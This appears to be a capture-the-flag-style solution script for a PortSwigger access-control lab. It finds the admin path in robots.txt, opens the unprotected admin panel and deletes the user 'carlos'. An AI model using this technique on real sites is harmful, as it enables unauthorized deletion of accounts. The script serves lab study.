"""
https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

url = f'https://{site}/robots.txt'
resp = s.get(url)
match_line = [line for line in resp.text.split('\n') if 'admin' in line]
uri = match_line[0].split(' ')[1]

url = f'https://{site}{uri}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')